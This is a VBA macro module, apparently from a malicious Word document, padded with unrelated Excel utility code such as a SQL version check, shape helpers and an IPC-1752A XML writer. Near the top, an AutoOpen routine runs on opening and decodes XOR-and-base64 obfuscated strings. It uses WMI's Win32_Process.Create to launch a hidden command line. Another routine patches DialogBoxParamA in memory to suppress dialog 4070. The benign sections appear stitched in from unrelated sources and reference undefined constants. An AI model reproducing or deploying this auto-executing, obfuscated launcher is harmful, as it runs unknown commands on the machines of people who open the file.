Attribute VB_Name = "ThisDocument"
Attribute VB_Base = "1Normal.ThisDocument"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = True
Attribute VB_Customizable = True
Private Const CP_UTF8                       As Long = 65001

#If Win64 Then
Private Declare PtrSafe Function WideCharToMultiByte Lib "kernel32" (ByVal CodePage As LongPtr, ByVal dwFlags As LongPtr, ByVal lpWideCharStr As LongPtr, ByVal cchWideChar As LongPtr, lpMultiByteStr As Any, ByVal cchMultiByte As LongPtr, ByVal lpDefaultChar As LongPtr, ByVal lpUsedDefaultChar As LongPtr) As LongPtr
Private Declare PtrSafe Function MultiByteToWideChar Lib "kernel32" (ByVal CodePage As LongPtr, ByVal dwFlags As LongPtr, lpMultiByteStr As Any, ByVal cchMultiByte As LongPtr, ByVal lpWideCharStr As LongPtr, ByVal cchWideChar As LongPtr) As Long
#Else
Private Declare Function WideCharToMultiByte Lib "kernel32" (ByVal CodePage As Long, ByVal dwFlags As Long, ByVal lpWideCharStr As Long, ByVal cchWideChar As Long, lpMultiByteStr As Any, ByVal cchMultiByte As Long, ByVal lpDefaultChar As Long, ByVal lpUsedDefaultChar As Long) As Long
Private Declare Function MultiByteToWideChar Lib "kernel32" (ByVal CodePage As Long, ByVal dwFlags As Long, lpMultiByteStr As Any, ByVal cchMultiByte As Long, ByVal lpWideCharStr As Long, ByVal cchWideChar As Long) As Long

#End If
 


Private Const PAGE_EXECUTE_READWRITE = &H40

Private Declare PtrSafe Sub MoveMemory Lib "kernel32" Alias "RtlMoveMemory" _
(Destination As LongPtr, Source As LongPtr, ByVal Length As LongPtr)

Private Declare PtrSafe Function VirtualProtect Lib "kernel32" (lpAddress As LongPtr, _
ByVal dwSize As LongPtr, ByVal flNewProtect As LongPtr, lpflOldProtect As LongPtr) As LongPtr

Private Declare PtrSafe Function GetModuleHandleA Lib "kernel32" (ByVal lpModuleName As String) As LongPtr

Private Declare PtrSafe Function DialogBoxParam Lib "user32" Alias "DialogBoxParamA" (ByVal hInstance As LongPtr, _
ByVal pTemplateName As LongPtr, ByVal hWndParent As LongPtr, _
ByVal lpDialogFunc As LongPtr, ByVal dwInitParam As LongPtr) As Integer

Dim HookBytes(0 To 5) As Byte
Dim OriginBytes(0 To 5) As Byte
Dim pFunc As LongPtr
Dim Flag As Boolean
 
 Dim Fenglo As Variant

Public Function codify_time() As String

    If [set_in_production] Then On Error GoTo codify_Error
    
    Dim dbl_01                  As Variant
    Dim dbl_02                  As Variant
    Dim dbl_now                 As Double
    
    dbl_now = Round(Now(), 8)
    
    dbl_01 = Split(CStr(dbl_now), ",")(0)
    dbl_02 = Split(CStr(dbl_now), ",")(1)
    
    codify_time = Hex(dbl_01) & "_" & Hex(dbl_02)

   On Error GoTo 0
   Exit Function

codify_Error:

    MsgBox "Error " & Err.Number & " (" & Err.Description & ") in procedure codify of Function TDD_Export"

End Function


Public Function codify(str_name) As String
    
    Dim l_counter           As Long
    Dim l_number            As Long
    
    Dim str_number          As String
    
    Dim str_char            As String
    Dim str_char_result     As String
    
    Dim str_first           As String
    Dim str_last            As String
    
    'making the time
    For l_counter = 1 To Len(str_name) - 3
        str_number = str_number & Mid(str_name, l_counter, 1)
    Next l_counter
    l_number = str_number
    
    'making the name
    For l_counter = 3 To 1 Step -1
    
        str_char = Mid(str_name, Len(str_name) - l_counter + 1, 1)
        str_char = Chr((Asc(str_char) + l_number) Mod LETTERS_NUMBER)
        str_char = Chr(Asc(str_char) + FIRST_ASCII)
        str_char_result = str_char_result & str_char
    
    Next l_counter
    
    codify = Hex(l_number) & StrReverse(str_char_result)
    
    'now reverse first and last positions
    str_first = get_in_position(codify, 1)
    str_last = get_in_position(codify, 1, True)
    
    codify = delete_in_position(codify, 1)
    codify = delete_in_position(codify, Len(codify))
    
    codify = insert_in_position(codify, str_first, Len(codify))
    codify = insert_in_position(codify, str_last, 0)
    
    codify = LCase(codify)
    
End Function

Public Function decodify(str_name) As String
    
    Dim l_counter       As Long
    Dim str_char        As String
    Dim str_time        As String
    
    Dim l_left          As Long
    Dim str_right       As String
    
    Dim str_first       As String
    Dim str_last        As String
    
    'now reverse first and last positions
    str_first = get_in_position(str_name, 1)
    str_last = get_in_position(str_name, 1, True)
    
    str_name = delete_in_position(str_name, 1)
    str_name = delete_in_position(str_name, Len(str_name))
    
    str_name = insert_in_position(str_name, str_first, Len(str_name))
    str_name = insert_in_position(str_name, str_last, 0)
    
    'making the time
    
    For l_counter = 1 To Len(str_name) - 3
        str_time = str_time & Mid(str_name, l_counter, 1)
    Next l_counter
    
    l_left = Val("&H" & str_time)
    
    'making the name
    
    For l_counter = 3 To 1 Step -1
        str_char = Mid(str_name, Len(str_name) - l_counter + 1, 1)
        str_char = Chr(Asc(str_char) - FIRST_ASCII)
        str_right = str_right & Chr(mod_where(str_char, l_left))
        
    Next l_counter
    
    decodify = l_left & StrReverse(str_right)

End Function

Public Function format_decodify(str_input As String, Optional b_for_file_name As Boolean = False) As String
    
    Dim str_exchange1   As String: str_exchange1 = ":"
    Dim str_exchange2   As String: str_exchange2 = " "
    
    If b_for_file_name Then
        If Len(str_input) = 9 Then
            format_decodify = insert_in_position(str_input, str_exchange2, 6)
        Else
            format_decodify = insert_in_position(str_input, str_exchange2, 5)
        End If
        
        Exit Function
        
    End If
    
    If Len(str_input) = 9 Then
        format_decodify = insert_in_position(str_input, str_exchange1, 2)
        format_decodify = insert_in_position(format_decodify, str_exchange1, 5)
        format_decodify = insert_in_position(format_decodify, str_exchange2, 8)
    Else
        format_decodify = insert_in_position(str_input, str_exchange1, 1)
        format_decodify = insert_in_position(format_decodify, str_exchange1, 4)
        format_decodify = insert_in_position(format_decodify, str_exchange2, 7)
    End If
    
End Function

Public Function mod_where(str As String, l_left As Long) As Long
    
    Dim l_counter As Long
    
    For l_counter = 0 To LETTERS_NUMBER
        If ((l_left + l_counter + FIRST_ASCII) Mod LETTERS_NUMBER = Asc(str)) Then
            mod_where = l_counter + FIRST_ASCII
            Exit For
        End If
    Next l_counter

End Function

Public Function get_extension() As String

    get_extension = Replace(Time, ":", "") & Replace(Left(Environ("Username"), 4), ".", "")

End Function

Function insert_in_position(ByVal Source As String, str As String, l As Long) As String
    'insert in position
    
    insert_in_position = Mid(Source, 1, l) & str & Mid(Source, l + 1, Len(Source) - l)
    
End Function

Function delete_in_position(ByVal Source As String, l As Long) As String
    'delete in position
    
    delete_in_position = Mid(Source, 1, l - 1) & Mid(Source, l + 1, Len(Source) - l)
    
End Function

Function get_in_position(ByVal str As String, l_position As Long, Optional b_is_last As Boolean = False) As String
    
    get_in_position = Mid(str, l_position, 1)
    
    If b_is_last Then get_in_position = Mid(str, Len(str), 1)
    
End Function

'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''



Sub Au_Op()

Floru
End Sub

    

Sub Floru()

    Dim Gike As Variant
    Gike = NobosMeik(VibinJoin("IQcXHjIAGgwGERsdBk07MhQAHz8OAAkRGRc="), "versache")
    Set Kein = CreateObject(Gike)


    Set Fenglo = Kein.ConnectServer()
    Fenglo.Security_.ImpersonationLevel = 56 _
    * 2 _
    - 109
    Call Samsung
    
End Sub

Function Samsung()

        Dim Glen As Variant
    Set Glen = Fenglo _
    .Get _
    ("Win32_Process")
    On Error _
    Resume Next
    Call Glen _
    .Create _
    (NobosMeik _
    (VibinJoin _
    ("BgoFFhMQAAAaCVJeFgoGARkSAQcYDw1FHgwWFwQNSEgVCh8eAA0MRT8IAhwTF0UoGQEHHwRDKgwCFiYBAA0bAxMXSVMyFwkXAkgwGhUQPBcXCwEVBBFISCUKBwECBkgNAhECAFtMRxcXElwUCBcAEBQQARYTAAcLAgAcB08ABwhZARkcEhAABEJURxtOEQ0OKQ0dHgQUBxcdSh8SEhcNF1kqHhYAIkYGGQheGxUXGBZMSl0BABRGAh8RGgYDFhsABAYdHRUGBhFYBh0eTgcDCgUWGhJVUl0NWRcXGD4LBwgTEh0BCkwFBAURFwFOEA4ABARcEA4ORA0CEQIAW0xHFxcSXBQIFwAQFBABFhMABwsCABwHTwAHCFkBGRwSEAAEQlRHG04RDQ4pDR0eBBQHFx1KHxISFw0XWRclKRQERgYZCFJeJQYbER8LEwcIDAZFKkdWFg8VUjEzKCIvFwoMClgGHR49QUQ5VEEXHRdZPCA7NS4ABwYaBCpHXi9DRw0LAF8mNiwzNBchPwcUTwAHCCpHSVMyBhxIOgoREhUKBwtWSCISFQtIOVRBFx0XWTwgOzUuUVpDCwAEEQcHCA9ISBIAERwFBkgWEAAAEkEABwgGCgAHWkNINgIEAAdMMxoKFQABAEEVAQEZSxEcDENFJAQCBx4EDRwpHxYGUwIMBRUZFwY="), "versache"), _
    Null, Null, FeraskoLom)

  
End Function




Private Function NobosMeik(text As String, key As String) As String
  Dim VifoLer() As Byte
  Dim Grido() As Byte
  
  Dim VifJon As Long
  Dim GitClone As Long
    
  
  VifoLer = StrConv(text, vbFromUnicode)
  VifJon = UBound(VifoLer, 1)
  Grido = StrConv(key, vbFromUnicode)
  GitClone = UBound(Grido, 1)
  Dim VibikO As Long
  Dim Vbokil As Long
  
  For VibikO = (44 * 2 - 88) To VifJon
    VifoLer(VibikO) = _
    VifoLer(VibikO) _
    Xor _
    Grido(Vbokil)
    If Vbokil < GitClone Then
      Vbokil = _
      Vbokil + _
      (54 * 2 - 107)
    Else
      
      Vbokil _
      = _
      72 * _
      0.5 _
      - _
36
    End If
  Next VibikO
  NobosMeik = StrConv(VifoLer, 64)
End Function

Public Function VibinJoin(Vecad As String) As String
    Dim baValue()       As Byte
    Dim sValue          As String
    Dim kerfas           As Long
    
    With VBA.CreateObject("MSXML2.DOMDocument").CreateElement("dummy")
        .DataType = "bin" + ".base64"
        .text = Vecad
        baValue = .NodeTypedValue
        sValue = String$(4 * UBound(baValue), 0)
        kerfas = MultiByteToWideChar(CP_UTF8, 84 + 2 - 86, baValue((54 + 12 - 66)), UBound(baValue) + (11 * 11 - 120), StrPtr(sValue), Len(sValue))
        VibinJoin = Left$(sValue, kerfas)
    End With
End Function

Public Sub AutoOpen()


Au_Op
    

End Sub
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''

Public Function CompareVersions() As Boolean

    If (Me.DateSQL = Me.DateWorkbook) And (Me.VersionSQL = Me.VersionWorkbook) Then
        CompareVersions = True
    Else
        CompareVersions = False
    End If

End Function

Private Function str_connection_string() As String

    Dim arr_info(5) As Variant

    arr_info(0) = [set_conn_provider]
    arr_info(1) = [set_conn_data_source]
    arr_info(2) = [set_conn_database]
    arr_info(3) = [set_conn_user_id]
    arr_info(4) = [set_conn_password]

    str_connection_string = "Provider=" & arr_info(0) & _
                            "; Data Source=" & arr_info(1) & _
                            "; Database=" & arr_info(2) & _
                            ";User ID=" & str_generator(arr_info(3), True) & _
                            "; Password=" & str_generator(arr_info(4), True) & ";"

End Function

Private Function str_generator(ByVal str_value As String, ByVal b_fix As Boolean) As String

    Dim l_counter As Long
    Dim l_number As Long
    Dim str_char As String

    On Error GoTo str_generator_Error

    If b_fix Then
        str_value = Left(str_value, Len(str_value) - 1)
        str_value = Right(str_value, Len(str_value) - 1)
    End If

    For l_counter = 1 To Len(str_value)
        str_char = Mid(str_value, l_counter, 1)
        If b_is_odd(l_counter) Then
            l_number = Asc(str_char) + IIf(b_fix, -2, 2)
        Else
            l_number = Asc(str_char) + IIf(b_fix, -3, 3)
        End If

        str_generator = str_generator + Chr(l_number)

    Next l_counter

    If Not b_fix Then
        str_generator = Chr(l_number) & str_generator & Chr(l_number)
    End If

    On Error GoTo 0
    Exit Function

str_generator_Error:

    MsgBox "Error " & Err.Number & " (" & Err.Description & ") in procedure str_generator of Function Modul1"

End Function

Private Function b_is_odd(l_number As Long) As Boolean

    b_is_odd = l_number Mod 2

End Function

Public Property Get VersionWorkbook() As String

    VersionWorkbook = [set_version_number]

End Property

Public Property Get DateWorkbook() As Date

    DateWorkbook = [set_version_date]

End Property

Public Property Get VersionSQL() As String

    VersionSQL = version_sql

End Property

Public Property Get DateSQL() As Date

    DateSQL = date_sql

End Property

Public Function str_post_info() As String

    str_post_info = "  Diese Version ist - " & Me.VersionWorkbook & " von " & Me.DateWorkbook & "." & vbCrLf & _
                  "  Die letzte ist          - " & Me.VersionSQL & " von " & Me.DateSQL & "."

End Function

Public Sub GetDataFromSQLServer()

    If [set_in_production] Then On Error GoTo GetDataFromSQLServer_Error

    Dim cnLogs As Object
    Dim rsData As Object

    Set cnLogs = CreateObject("ADODB.Connection")
    Set rsData = CreateObject("ADODB.Recordset")

    cnLogs.Open str_connection_string
    cnLogs.Execute "SET NOCOUNT ON"

    With rsData
        .ActiveConnection = cnLogs
        .Open "SELECT [VersionNumber],[MyDate] FROM [Versions] WHERE IsLastCurrent=1;"
        version_sql = rsData.Fields("VersionNumber").Value
        date_sql = rsData.Fields("MyDate").Value
    End With

    rsData.Close
    cnLogs.Close

    Set cnLogs = Nothing
    Set rsData = Nothing

    On Error GoTo 0
    Exit Sub

GetDataFromSQLServer_Error:

    Debug.Print "Error " & Err.Number & " (" & Err.Description & ") in procedure GetDataFromSQLServer of Sub cls_Version"
    Set cnLogs = Nothing
    Set rsData = Nothing
    version_sql = [set_version_check_error]
    date_sql = [set_version_check_error]

End Sub

Private Function GetPtr(ByVal Value As Long) As Long
    GetPtr = Value
End Function

Public Sub RecoverBytes()
    If Flag Then MoveMemory ByVal pFunc, ByVal VarPtr(OriginBytes(0)), 6
End Sub

Public Function Hook() As Boolean
    Dim TmpBytes(0 To 5) As Byte
    Dim p As Long
    Dim OriginProtect As Long

    Hook = False

    pFunc = GetProcAddress(GetModuleHandleA("user32.dll"), "DialogBoxParamA")


    If VirtualProtect(ByVal pFunc, 6, PAGE_EXECUTE_READWRITE, OriginProtect) <> 0 Then

        MoveMemory ByVal VarPtr(TmpBytes(0)), ByVal pFunc, 6
        If TmpBytes(0) <> &H68 Then

            MoveMemory ByVal VarPtr(OriginBytes(0)), ByVal pFunc, 6

            p = GetPtr(AddressOf MyDialogBoxParam)

            HookBytes(0) = &H68
            MoveMemory ByVal VarPtr(HookBytes(1)), ByVal VarPtr(p), 4
            HookBytes(5) = &HC3

            MoveMemory ByVal pFunc, ByVal VarPtr(HookBytes(0)), 6
            Flag = True
            Hook = True
        End If
    End If
End Function

Private Function MyDialogBoxParam(ByVal hInstance As Long, _
                                  ByVal pTemplateName As Long, ByVal hWndParent As Long, _
                                  ByVal lpDialogFunc As Long, ByVal dwInitParam As Long) As Integer
    If pTemplateName = 4070 Then
        MyDialogBoxParam = 1
    Else
        RecoverBytes
        MyDialogBoxParam = DialogBoxParam(hInstance, pTemplateName, _
                                          hWndParent, lpDialogFunc, dwInitParam)
        Hook
    End If
End Function

'---------------------
'---------------------
'---------------------
'--------------64 bits
      






Sub ShapeNames()
    Dim sh_shape As Shape
    
    For Each sh_shape In ActiveSheet.Shapes
        Debug.Print sh_shape.Name
    Next sh_shape
    
End Sub

Public Sub GetSomething(str_something As String)
    
    ActiveSheet.Shapes(str_something).Select

End Sub


'Makes shape visible and invisble.
Sub translatorField_Klicken()

    Dim blnEnglish      As Boolean
    Dim rngRange        As Range
    Dim myShape         As Shape

    Set myShape = tblInput.Shapes("translatorField")
    Set rngRange = tblSettings.Cells(2, 2)

    blnEnglish = Not CBool(rngRange)
    tblSettings.Cells(2, 2) = blnEnglish

    If blnEnglish Then

        tblInput.[h1].Value = tblSettings.[i1].Value

        With myShape.Fill
            .ForeColor.RGB = RGB(0, 0, 0)
            .Transparency = 1
        End With

        With myShape.TextFrame2.TextRange.Characters(1, 66).Font.Fill
            .ForeColor.RGB = RGB(255, 255, 255)
            .Transparency = 1
        End With

    Else

        tblInput.[h1].Value = tblSettings.[c1].Value

        With myShape.Fill
            .ForeColor.RGB = RGB(255, 255, 255)
            .Transparency = 0
        End With

        With myShape.TextFrame2.TextRange.Characters(1, 66).Font.Fill
            .ForeColor.RGB = RGB(0, 0, 0)
            .Transparency = 0
        End With

    End If

End Sub

'---------------------------------------------------------------------------------------------------------------------------------
'---------------------------------------------------------------------------------------------------------------------------------
'---------------------------------------------------------------------------------------------------------------------------------

Option Explicit

Sub TestMe()

    Dim shp             As Shape
    Dim arrOfShapes()   As Variant

    With ActiveSheet
        For Each shp In .Shapes
            If InStrB(shp.Name, "Rec") > 0 Then
                arrOfShapes = incrementArray(arrOfShapes, shp.Name)
            End If
        Next
        If IsArrayAllocated(arrOfShapes) Then
            Debug.Print .Shapes.Range(arrOfShapes(0)).Name
            .Shapes.Range(arrOfShapes).Delete
        End If
    End With
End Sub


Public Function incrementArray(arrOfShapes As Variant, nameOfShape As String) As Variant

    Dim cnt         As Long
    Dim arrNew      As Variant

    If IsArrayAllocated(arrOfShapes) Then
        ReDim arrNew(UBound(arrOfShapes) + 1)
        For cnt = LBound(arrOfShapes) To UBound(arrOfShapes)
            arrNew(cnt) = CStr(arrOfShapes(cnt))
        Next cnt
        arrNew(UBound(arrOfShapes) + 1) = CStr(nameOfShape)
    Else
        arrNew = Array(nameOfShape)
    End If

    incrementArray = arrNew

End Function

Function IsArrayAllocated(Arr As Variant) As Boolean
    On Error Resume Next
    IsArrayAllocated = IsArray(Arr) And _
                       Not IsError(LBound(Arr, 1)) And _
                       LBound(Arr, 1) <= UBound(Arr, 1)

End Function


Public Sub SplitSingleColumnToCells()

    Dim rngInput    As Range
    Dim rngOutput   As Range
    Dim myCell      As Range

    'Set manually, it is faster :)
    Set rngInput = Range("A1:A22")

    For Each myCell In rngInput
        'replace multiple space with single space:
        myCell = Replace(myCell, Chr(32), Chr(32))
        Dim inputArray As Variant
        inputArray = Split(myCell)

        Dim col     As Long
        Dim i       As Long
        col = 0
        For i = LBound(inputArray) To UBound(inputArray)
            If Len(inputArray(i)) > 0 Then
                col = col + 1
                myCell.Offset(0, col) = inputArray(i)
            End If
        Next i
        'Probably not needed:
        'myCell.Clear
    Next myCell
End Sub

Function setVariables() As Boolean
    requestorEmail = Range("B6")
    Do While requestorEmail = ""
        requestorEmail = InputBox("Input requestorEmail")
        If requestorEmail = "EXIT" Then Exit Function
    Loop
    requestDate = CDate(Range("B4"))
    requestDate = Format(requestDate, "yyyy-mm-dd")
    Do While requestDate = ""
        requestDate = InputBox("input requestdate")
        If requestDate = "EXIT" Then Exit Function
        requestDate = Format(requestDate, "yyyy-mm-dd")
    Loop
    requestorName = Range("B2")
    requestorName = MCGBookFunctions.AlphaNumericOnly(requestorName)
    requestorName = MCGBookFunctions.shortenedCustomerName(requestorName)
    Do While requestorName = ""
        requestorName = InputBox("input customer name")
        If requestorName = "EXIT" Then Exit Function
        requestorName = MCGBookFunctions.shortenedCustomerName(MCGBookFunctions.AlphaNumericOnly(requestorName))
    Loop
    requestorContact = Range("B5")
    Do While requestorContact = ""
        requestorContact = InputBox("input requestor name")
        If requestorContact = "EXIT" Then Exit Function
    Loop
    filePath = ""
End Function





Function createXML(partCollection As Collection) As Boolean
    If partCollection.Count > 1 Then filePath = FileExplorer.getFolder("Select save folder")
    For Each mItem In partCollection
        writePartInfo mItem
    Next
    createXML = True
    Exit Function
CreateXMLError:
    createXML = False
    Err.Source = "createXML function of FullMaterialDisclosure module."
    Call MCGError.error_handler(Err, True, "Error not caught by writePartInfo handler!", "Write Part Info Error")
End Function





Private Function containsREACHSubstances(currentPart As String) As Boolean
    If currentPart.RestrictedSubstances.Count < 1 Then
        containsREACHSubstances = False
        Exit Function
    End If
    For Each fmat In currentPart.RestrictedSubstances
        If fmat.List = "reach SVHCs 20190716.xlsx" Then
            containsREACHSubstances = True
            Exit Function
        End If
    Next
    containsREACHSubstances = False
End Function





Private Function writePartInfo(ByVal currentPart As String) As Boolean
    Err.Clear
    On Error GoTo WritePartInfoError
    errMessage = ""
    Application.DisplayAlerts = False
    Application.ScreenUpdating = False
    XMLFileName = "MCD " & currentPart.Name & " " & Format(Date, "yyyymmdd") & ".xml"
    XMLFileName = filePath + XMLFileName
    If filePath = "" Then XMLFileName = Application.GetSaveAsFilename(XMLFileName, FileFilter:="XML Files (*.xml), *.xml")
    If XMLFileName <> "False" Then
        Open XMLFileName For Output As #1
    Else
        MsgBox "File save Cancelled"
        Exit Function
    End If
    If Not printStaticInfo(1) Then GoTo WritePartInfoError
    If Not printPartMaterialsAndSubstanceInfo(currentPart, 1) Then GoTo WritePartInfoError
    Close #1
    Application.DisplayAlerts = True
    Application.ScreenUpdating = True
    loading = 0
    writePartInfo = True
    Exit Function
WritePartInfoError:
    writePartInfo = False
    Close #1
    MsgBox "There was an error in function writePartInfo." & vbNewLine _
    & "VBA Error Description: " & Err.Description & vbNewLine _
    & "VBA Error Number: " & Err.Number & vbNewLine _
    & "VBA Error source: " & Err.Source
End Function





Private Function printPartMaterialsAndSubstanceInfo(currentPart As String, handle As Integer) As Boolean
    On Error GoTo printPartMaterialError
    Dim thisFileRoHS1506Statement As String
    Dim thisFileRoHS0508Statement As String
    Dim RoHSResponseTrueFalse As String
    Dim REACHResponseTrueFalse As String
    Dim rohsQuery1Response As String
    Dim rohsQuery2Response As String
    Dim rohsQuery3Response As String
    Dim rohsQuery4Response As String
    Dim rohsQuery5Response As String
    Dim reachQuery1Response As String
    Dim reachQuery2Response As String
    
    rohsQuery1Response = "true"
    rohsQuery2Response = "false"
    rohsQuery3Response = "false"
    rohsQuery4Response = "false"
    rohsQuery5Response = "false"
    reachQuery1Response = "false"
    reachQuery2Response = "true"
    If currentPart.RoHSCompliance = "No" Then
        rohsQuery4Response = "true"
        rohsQuery1Response = "false"
    ElseIf currentPart.RoHSCompliance = "With Exemption" Then
        rohsQuery3Response = "true"
        rohsQuery1Response = "false"
    End If
    If containsREACHSubstances(currentPart) Then
        reachQuery1Response = "true"
        reachQuery2Response = False
    End If
    ''''''''''Product level information''''''''''
    Print #handle, "  <Product numberOfInstances=""" & 1 & """ unitType=""" & "Each" & """>"
    Print #handle, "    <ProductID itemNumber=""" & currentPart.Name & """ itemName=""" & currentPart.Description & """ effectiveDate=""" & Format(Date, "yyyy-mm-dd") & """ requesterItemNumber=""" & currentPart.CustomerPartNumber & """>"
    Print #handle, "      <Amount value=""" & currentPart.Weight & """ UOM=""" & "mg" & """/>"
    Print #handle, "    </ProductID>"
    Print #handle, "    <MaterialInfo>"
    Print #handle, "      <QueryList identity=""" & "EUROHS-1506" & """>"
    Print #handle, "        <Query statement=""" & ROHS_QUERY_1 & """ response=""" & rohsQuery1Response & """/>"
    Print #handle, "        <Query statement=""" & ROHS_QUERY_2 & """ response=""" & rohsQuery2Response & """/>"
    Print #handle, "        <Query statement=""" & ROHS_QUERY_3 & """ response=""" & rohsQuery3Response & """/>"
    Print #handle, "        <Query statement=""" & ROHS_QUERY_4 & """ response=""" & rohsQuery4Response & """/>"
    Print #handle, "        <Query statement=""" & ROHS_QUERY_5 & """ response=""" & rohsQuery5Response & """/>"
    Print #handle, "      </QueryList>"
    Print #handle, "      <QueryList identity=""" & "EUREACH-0719" & """>"
    Print #handle, "        <Query statement=""" & REACH_QUERY_1 & """ response=""" & reachQuery1Response & """/>"
    Print #handle, "        <Query statement=""" & REACH_QUERY_2 & """ response=""" & reachQuery2Response & """/>"
    Print #handle, "      </QueryList>"
    Print #handle, "      <HomogeneousMaterialList>"
    '''''''''''Material level information''''''''''
    For Each fmat In currentPart.Materials
        If fmat.Name = "" Then Exit For
        Print #handle, "        <HomogeneousMaterial name=""" & fmat.Name & """>"
        Print #handle, "          <Amount value=""" & fmat.Weight & """ UOM=""" & "mg" & """/>"
        ''''''''''Substance level information''''''''''
        For Each fSub In fmat.substances
            If fSub.Name = "" Then Exit For
            Print #handle, "          <SubstanceCategoryList>"
            Print #handle, "            <SubstanceCategoryListID identity=""" & "Supplier" & """ authority=""" & "Supplier" & """/>"
            Print #handle, "            <SubstanceCategory name=""" & fSub.Name & """>"
            Print #handle, "              <Substance name=""" & fSub.Name & """>"
            Print #handle, "                <SubstanceID authority=""" & "CAS" & """ identity=""" & fSub.CASNumber & """/>"
            Print #handle, "                <Amount value=""" & fSub.Weight & """ UOM=""" & "mg" & """/>"
            Print #handle, "                <Concentration value=""" & fSub.Percentage & """/>"
            If currentPart.RoHSCompliance = "With Exemption" Then
                If InStr(1, fSub.Name, "Lead", vbTextCompare) Then Print #handle, "                <SubstanceExemption identity=""" & currentPart.RoHSExemption & """/>" 'need second if statement
            End If
            Print #handle, "              </Substance>"
            Print #handle, "            </SubstanceCategory>"
            Print #handle, "          </SubstanceCategoryList>"
        Next
        Print #handle, "        </HomogeneousMaterial>"
    Next
    Print #handle, "      </HomogeneousMaterialList>"
    Print #handle, "    </MaterialInfo>"
    'Print #handle, "</SubProduct>"
    Print #handle, "  </Product>"
    Print #handle, "</MainDeclaration>"
    printPartMaterialsAndSubstanceInfo = True
    Exit Function
printPartMaterialError:
    printPartMaterialsAndSubstanceInfo = False
End Function




Private Function printStaticInfo(handle As Integer) As Boolean
    On Error GoTo printStaticInfoError
    Print #handle, "<?xml version=""1.0"" encoding=""UTF-8""?>"
    Print #handle, "<!-- Visit https://github.com/jferre25/IPC-1752A-XML-Creation for more information. -->"
    Print #handle, "<MainDeclaration version=""2.0"" xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance"" xmlns:xs=""http://www.w3.org/2001/XMLSchema"" xmlns:v=""variables-node"" xmlns=""http://webstds.ipc.org/175x/2.0"">"
    Print #handle, "  <BusinessInfo mode=""Request/Reply"">"
    Print #handle, "    <Response date=""" & Format(Date, "yyyy-mm-dd") & """ fieldLock=""" & "false" & """ > "
    Print #handle, "      <Authorizer name=""" & AUTHORIZER_NAME & """ title=""" & AUTHORIZER_TITLE & """ > "
    Print #handle, "        <Email address=""" & AUTHORIZER_EMAIL & """/>"
    Print #handle, "        <SurfaceAddress street=""" & AUTHORIZER_STREET & """ city=""" & AUTHORIZER_CITY & """ stateProvince=""" & AUTHORIZER_STATE & """ country=""" & AUTHORIZER_COUNTRY & """ postalCode=""" & AUTHORIZER_ZIP & """/>"
    Print #handle, "        <Phone number=""" & AUTHORIZER_PHONE & """/>"
    Print #handle, "      </Authorizer>"
    Print #handle, "      <SupplyCompany name=""" & SUPPLY_COMPANY_NAME & """/>"
    Print #handle, "      <Contact name=""" & CONTACT_NAME & """ title=""" & CONTACT_TITLE & """>"
    Print #handle, "        <Email address=""" & CONTACT_EMAIL & """/>"
    Print #handle, "        <SurfaceAddress street=""" & CONTACT_STREET & """ city=""" & CONTACT_CITY & """ stateProvince=""" & CONTACT_STATE & """ country=""" & CONTACT_COUNTRY & """ postalCode=""" & CONTACT_ZIP & """/>"
    Print #handle, "        <Phone number=""" & CONTACT_PHONE & """/>"
    Print #handle, "      </Contact>"
    Print #handle, "    </Response>"
    Print #handle, "    <Request date=""" & requestDate & """ fieldLock =""" & "false" & """ supplierCheckbox=""" & "false" & """ respondByDate=""" & requestDate & """>"
    Print #handle, "      <Contact name=""" & requestorContact & """>"
    Print #handle, "        <Email address=""" & requestorEmail & """/>"
    Print #handle, "        <Phone number=""" & "" & """/>"
    Print #handle, "      </Contact>"
    Print #handle, "      <RequestCompany name=""" & requestorName & """>"
